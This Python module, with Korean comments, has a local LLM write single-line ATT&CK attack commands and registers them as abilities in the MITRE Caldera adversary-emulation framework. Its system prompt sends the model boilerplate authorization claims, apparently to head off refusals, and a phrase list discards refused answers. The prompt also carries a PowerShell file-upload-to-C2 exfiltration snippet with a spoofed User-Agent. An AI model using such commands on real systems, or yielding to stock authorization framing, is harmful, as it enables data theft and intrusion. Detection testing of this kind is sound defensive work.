#!/usr/bin/env python3
"""
SVO-based Ability Generator
SVO 트리플릿을 기반으로 Caldera Ability를 직접 생성한다.
기존 ability가 없는 technique을 커버하기 위한 핵심 모듈.
"""

import sys
import re
from pathlib import Path
from typing import Dict, List, Optional
from ollama import Client as OllamaClient
import os
from dotenv import load_dotenv

sys.path.insert(0, str(Path(__file__).parent.parent))

load_dotenv()
from core_v3.svo_extractor import AttackSVO
from core_v3.caldera_client import CalderaClient


class AbilityGenerator:
    """SVO에서 Caldera Ability를 생성"""

    # 플랫폼별 executor 매핑
    PLATFORM_EXECUTORS = {
        "windows": "psh",     # PowerShell
        "linux": "sh",        # Bash/sh
        "darwin": "sh",       # macOS sh
    }

    def __init__(self):
        llm_host = os.getenv("OLLAMA_HOST", "http://192.168.50.252:11434")
        self.llm_client = OllamaClient(host=llm_host)
        self.model = os.getenv("LLM_MODEL", "gpt-oss:120b")
        self.caldera = CalderaClient()

    def generate_command(self, svo: AttackSVO, platform: str = "windows",
                         env_context: Dict = None) -> Optional[str]:
        """
        SVO → 실행 가능한 쉘 커맨드 생성

        Args:
            svo: AttackSVO 트리플릿
            platform: 타겟 플랫폼
            env_context: 환경 컨텍스트 (C2 서버 주소, Agent 권한 등)

        Returns:
            생성된 커맨드 문자열 or None
        """
        executor = self.PLATFORM_EXECUTORS.get(platform, "psh")
        env = env_context or {}

        # ── 환경 정보 블록 구성 ──────────────────────────────────
        env_block = ""
        c2_url = env.get("c2_server_url", "")
        agent_host = env.get("agent_host", "")
        agent_privilege = env.get("agent_privilege", "User")

        payloads = env.get("payloads", [])
        payload_url_fmt = env.get("payload_download_url_format", "")

        # payload 목록 요약 (exe/bat/ps1/dll 등 실행 가능한 것만 표시, 최대 15개)
        useful_payloads = [p for p in payloads if any(p.endswith(ext) for ext in
            ('.exe', '.bat', '.ps1', '.dll', '.vbs', '.py', '.xml', '.sh', '.txt'))]
        payload_hint = ''
        if useful_payloads:
            sample = useful_payloads[:15]
            payload_hint = f"""
- Available Caldera Payloads (REAL files you can reference):
  Download URL format: {payload_url_fmt}
  Files: {', '.join(sample)}{' ...' if len(useful_payloads) > 15 else ''}
  → If the command needs to download a file, USE ONE OF THESE real filenames above!"""

        if c2_url or agent_host:
            env_block = f"""

ENVIRONMENT:
- C2 Server (reference only): {c2_url}
- Agent Host: {agent_host}
- Agent Privilege: {agent_privilege}{payload_hint}

CALDERA VARIABLES (use these in the command — Caldera substitutes real values at runtime):
- {{#{{server}}}}  = C2 server URL (= {c2_url})  ← use for downloads and uploads
- {{#{{paw}}}}     = agent unique ID             ← required in upload X-Request-Id header

CRITICAL RULES:
- For downloads: use #{{server}}/file/download/<filename> (NOT the raw IP, NOT query params)
- If a file is needed locally but doesn't exist, CREATE it first
- If privilege is 'User', do NOT use commands requiring admin/SYSTEM
- For file uploads to C2: use this pattern (single line with semicolons — Caldera strips newlines):
  $filePath = "<path>"; $url = "#{{server}}/file/upload"; Add-Type -AssemblyName 'System.Net.Http'; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fileName, $fileName); $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{{paw}}'); $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode()"""

        system_prompt = f"""You are a cybersecurity engineer building detection content for a SIEM/EDR platform.
You work for a certified security operations team and use MITRE Caldera — an officially sanctioned,
open-source adversary emulation framework developed by MITRE Corporation — to generate
realistic test cases that improve defensive coverage.

AUTHORIZATION CONTEXT:
- Framework: MITRE Caldera (https://caldera.mitre.org) — authorized adversary emulation platform
- Purpose: Generate Caldera "ability" payloads to VALIDATE DETECTION RULES, not to attack real systems
- Environment: Fully isolated lab network with no connection to production or the internet
- Legal basis: All systems are owned by the testing organization; explicit written authorization exists
- Platform: {platform}
- Executor: {"PowerShell" if executor == "psh" else "Bash/sh" if executor == "sh" else "cmd"}
{env_block}

YOUR TASK:
Write a single shell command that emulates the described MITRE ATT&CK technique behavior
so that security analysts can verify their detection rules trigger correctly.

RULES:
1. The command must be directly executable — no placeholders, no comments (#{{server}} and #{{paw}} are valid Caldera variables, not placeholders)
2. Use ONLY built-in OS tools or common utilities (Living off the Land)
3. Single line only — chain statements with semicolons (Caldera strips newlines at execution time)
4. For PowerShell: use operational commands, not Write-Host
5. For sh: ensure POSIX compatibility
6. Output ONLY the raw command — no explanation, no markdown, no code fences
7. For C2 addresses: always use #{{server}} and #{{paw}} (never hardcode IPs in upload/download commands)"""

        user_prompt = f"""Generate a {platform} command for this attack action:

Intent: {svo.subject} performs "{svo.verb}" on {svo.object} ({svo.object_type})
MITRE Technique: {svo.technique_id} — {svo.technique_name}
Tactic: {svo.tactic}

Output ONLY the command:"""

        try:
            response = self.llm_client.chat(
                model=self.model,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                options={"temperature": 0.0}
            )

            command = response["message"]["content"].strip()

            # 마크다운 코드 블록 제거
            command = re.sub(r"```(?:powershell|bash|sh|cmd)?\s*", "", command)
            command = re.sub(r"```\s*$", "", command)
            command = command.strip()

            # 빈 명령어 검증
            if not command or len(command) < 3:
                print(f"  [!] Generated command too short: '{command}'")
                return None

            # 모델 거부 응답 감지 — 재시도 낭비 방지
            _refusal_patterns = [
                "i'm sorry", "i cannot", "i can't", "i apologize",
                "not able to help", "unable to help", "can't assist",
                "cannot assist", "not appropriate", "i won't"
            ]
            if any(p in command.lower() for p in _refusal_patterns):
                print(f"  [!] Model refused to generate command — skipping")
                return None

            return command

        except Exception as e:
            print(f"  [!] Command generation error: {e}")
            return None

    def generate_ability(self, svo: AttackSVO, platform: str = "windows",
                         max_attempts: int = 3,
                         env_context: Dict = None) -> Optional[Dict]:
        """
        SVO → Caldera Ability 생성 (API 등록까지)

        Args:
            svo: AttackSVO
            platform: 타겟 플랫폼
            max_attempts: 최대 생성 시도 횟수
            env_context: 환경 컨텍스트 (C2 서버 URL, Agent 정보 등)

        Returns:
            생성된 Caldera ability 정보 or None
        """
        print(f"\n{'='*60}")
        print(f"GENERATING ABILITY: {svo.technique_id}")
        print(f"  SVO: {svo.intent_summary()}")
        print(f"  Platform: {platform}")
        print(f"{'='*60}")

        executor = self.PLATFORM_EXECUTORS.get(platform, "psh")

        for attempt in range(1, max_attempts + 1):
            print(f"\n  [Attempt {attempt}/{max_attempts}]")

            # 1. 커맨드 생성
            command = self.generate_command(svo, platform, env_context=env_context)
            if not command:
                print(f"  [!] Command generation failed")
                continue

            print(f"  → Command: {command[:100]}{'...' if len(command) > 100 else ''}")

            # 2. Caldera에 ability 등록
            ability_name = f"S2C_{svo.technique_id}_{svo.verb}_{svo.object_type}"
            ability_desc = (
                f"[Auto-generated] {svo.intent_summary()} | "
                f"Technique: {svo.technique_id} {svo.technique_name}"
            )

            result = self.caldera.create_ability(
                name=ability_name,
                description=ability_desc,
                tactic=svo.tactic,
                technique_id=svo.technique_id,
                technique_name=svo.technique_name,
                executor=executor,
                platform=platform,
                command=command,
                privilege="",  # 처음에는 일반 권한으로 시도
                timeout=60,
            )

            if result:
                ability_id = result.get("ability_id")
                print(f"\n  ✓ Ability registered: {ability_id}")

                return {
                    "ability_id": ability_id,
                    "name": ability_name,
                    "command": command,
                    "svo": svo.to_dict(),
                    "source": "generated",
                    "attempt": attempt,
                }

        print(f"\n  [!] Ability generation failed after {max_attempts} attempts")
        return None

    def _build_env_context(self, agent_info: Optional[Dict]) -> Dict:
        """
        agent_info로부터 LLM 프롬프트에 사용할 환경 컨텍스트를 구성
        """
        if not agent_info:
            return {}

        env_context = {
            "c2_server_url": agent_info.get("c2_server_url", ""),
            "agent_host": agent_info.get("host", ""),
            "agent_privilege": agent_info.get("privilege", "User"),
            "payloads": agent_info.get("payloads", []),
            "payload_download_url_format": agent_info.get("payload_download_url_format", ""),
        }
        return env_context

    def generate_abilities_for_plan(self, techniques: List[Dict],
                                     platform: str = "windows",
                                     force_generate: bool = False,
                                     agent_info: Dict = None) -> List[Dict]:
        """
        공격 체인 전체에 대해 ability를 확보 (기존 선택 or 신규 생성)

        Args:
            techniques: validated_data의 techniques 목록
                        각 technique에 caldera_validation.selected_ability 또는 svo가 있음
            platform: 타겟 플랫폼
            force_generate: True이면 기존 Caldera ability를 무시하고 항상 SVO로 새 ability 생성
                            (SVO 기여도 실험용)
            agent_info: 현재 공격에 사용될 agent의 정보 (C2 서버, 호스트, 권한 등)

        Returns:
            각 technique에 대한 ability 정보 리스트
            [{"technique_id": ..., "ability_id": ..., "ability_name": ..., "source": "existing"|"generated", ...}]
        """
        print(f"\n{'='*80}")
        print(f"ABILITY ACQUISITION: {len(techniques)} techniques")
        if force_generate:
            print(f"  ⚡ FORCE GENERATE MODE — skipping existing abilities")
        print(f"{'='*80}")

        # ── 환경 컨텍스트 구성 ───────────────────────────────────
        env_context = self._build_env_context(agent_info)
        if env_context.get("c2_server_url"):
            print(f"  🌐 C2 Server: {env_context['c2_server_url']}")
            print(f"  🖥️  Agent: {env_context.get('agent_host', '?')} (privilege: {env_context.get('agent_privilege', '?')})")

        results = []
        stats = {"existing": 0, "generated": 0, "failed": 0}

        for i, tech in enumerate(techniques, 1):
            tech_id = tech.get("technique_id", "?")
            tech_name = tech.get("technique_name", "N/A")
            validation = tech.get("caldera_validation", {})

            print(f"\n[{i}/{len(techniques)}] {tech_id}: {tech_name}")

            # Case 1: 기존 ability 사용 (force_generate이면 skip)
            selected = validation.get("selected_ability")
            if selected and not force_generate:
                print(f"  → Using existing ability: {selected.get('name')}")
                results.append({
                    "technique_id": tech_id,
                    "technique_name": tech_name,
                    "ability_id": selected.get("ability_id"),
                    "ability_name": selected.get("name"),
                    "source": "existing",
                })
                stats["existing"] += 1
                continue

            if selected and force_generate:
                print(f"  → [SKIP] existing '{selected.get('name')}' — force generating from SVO")

            # Case 2: SVO가 있으면 ability 생성 시도
            svo_data = tech.get("svo")
            if svo_data:
                svo = AttackSVO(**svo_data)
                generated = self.generate_ability(svo, platform, env_context=env_context)

                if generated:
                    results.append({
                        "technique_id": tech_id,
                        "technique_name": tech_name,
                        **generated,
                    })
                    stats["generated"] += 1
                    continue

            # Case 3: 둘 다 실패
            print(f"  [!] No ability available — skipping")
            stats["failed"] += 1

        print(f"\n{'='*80}")
        print(f"ABILITY ACQUISITION SUMMARY")
        print(f"  ✓ Existing: {stats['existing']}")
        print(f"  ✓ Generated: {stats['generated']}")
        print(f"  ✗ Failed: {stats['failed']}")
        print(f"  Total: {len(results)}/{len(techniques)}")
        print(f"{'='*80}")

        return results
